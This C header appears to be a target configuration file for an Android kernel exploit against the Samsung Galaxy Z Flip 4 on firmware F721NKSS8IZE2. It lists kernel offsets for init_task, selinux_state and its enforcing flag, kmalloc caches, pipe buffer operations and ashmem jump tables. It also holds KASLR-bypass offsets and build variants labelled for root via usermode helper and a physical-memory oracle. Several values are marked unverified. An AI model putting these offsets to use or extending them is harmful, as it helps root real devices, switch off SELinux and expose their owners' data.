...
/*
 * b4q (SM-F721N Galaxy Z Flip 4) — F721NKSS8IZE2 (KOR)
 * kernel: 5.10.236-android12-9-31998796-abF721NKSS8IZE2
 * Android 16, Snapdragon 8 Gen 1 (SM8450)
 * 
 * Build fingerprint: samsung/b4qksx/b4q:16/BP2A.250605.031.A3/F721NKSS8IZE2:user/release-keys
 * Kernel release: 5.10.236-android12-9-31998796-abF721NKSS8IZE2
 * 
 * Device-verified offsets extracted from vmlinux-to-elf (kernel SHA-256:
 * 911D0A87F4CEDABDD6C578675CDE4C8285943AD471CB6499590324AF963D48C3)
 * 
 * No BTF in kernel image — all offsets derived from vmlinux-to-elf symbol table.
 */

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "b4q-F721NKSS8IZE2-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#define APP_REQUIRE_FRESH_P0_SESSION 1
#else
#define BUILD_VARIANT_LABEL "b4q-F721NKSS8IZE2-root-umh"
#endif

/* ---- Kernel image layout (F721NKSS8IZE2, extracted 2026-09-04) ---- */
...
#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL        /* SM8450 (verified from BL) */
...
#define ASHMEM_MISC_FOPS_OFF 0x026db7a8ULL   /* &ashmem_misc + 0x10 (miscdevice.fops) */
#define ASHMEM_FOPS_OFF      0x02078838ULL   /* &ashmem_fops           */
...
#define ASHMEM_LLSEEK_OFF        0x01115bb8ULL   /* ashmem_llseek          */
...
/* ---- Kernel data objects (derived from vmlinux-to-elf) ---- */
#define INIT_TASK_OFF           0x0258c000ULL   /* init_task           */
#define ROOT_TASK_GROUP_OFF     0x0278a040ULL   /* root_task_group     */
#define SELINUX_STATE_OFF       0x028bba68ULL   /* selinux_state       */
#define SELINUX_ENFORCING_OFF   0x028bba68ULL   /* selinux_state.enforcing (offset +0) */
#define KMALLOC_CACHES_OFF      0x020baa20ULL   /* kmalloc_caches      */
#define ANON_PIPE_BUF_OPS_OFF   0x01efbba8ULL   /* anon_pipe_buf_ops   */
#define SYSTEM_UNBOUND_WQ_OFF   0x02579e08ULL   /* system_unbound_wq   */
...
#define ASHMEM_IOCTL_JT_OFF           0x01115d58ULL
#define ASHMEM_COMPAT_IOCTL_JT_OFF    0x01116824ULL
#define ASHMEM_MMAP_JT_OFF            0x0111687cULL
#define ASHMEM_OPEN_JT_OFF            0x01116aacULL
#define ASHMEM_RELEASE_JT_OFF         0x01116b44ULL
#define ASHMEM_SHOW_FDINFO_JT_OFF     0x01116c60ULL
#define ASHMEM_LLSEEK_JT_OFF          0x01115bb8ULL
...
#define ASHMEM_OPEN_JT         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE_JT      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO_JT  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
...
/* ---- SLIDE KASLR bypass offsets (derived from vmlinux-to-elf) ---- */
...
/* TraceFS-based slide — TODO: derive event ID from target kernel trace events */
#define SLIDE_TRACEFS_EVENT_ID 84   /* TODO: verify from target kernel */
...
/* Derived from vmlinux-to-elf (strings found in kernel image) */
#define SLIDE_NFULNL_LOGGER_NAME_OFF          0x01dc7d90ULL   /* "nfnetlink_log" string */
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF        0x02581340ULL   /* nfulnl_logger struct */
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x0269b4d8ULL   /* &random_table[boot_id].data (TODO: verify offset within random_table) */
...
/* TraceFS worker caller offset — TODO: derive from worker_thread disassembly */
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00112ae0ULL   /* TODO: verify from target kernel */
...
#define KSNITCH_COLLISIONS 6      /* v5.10 needs more collisions */
...
#define P0_FINGERPRINT_HEADER \
  "targets/b4q-F721NKSS8IZE2/p0_fingerprint.h"
#endif
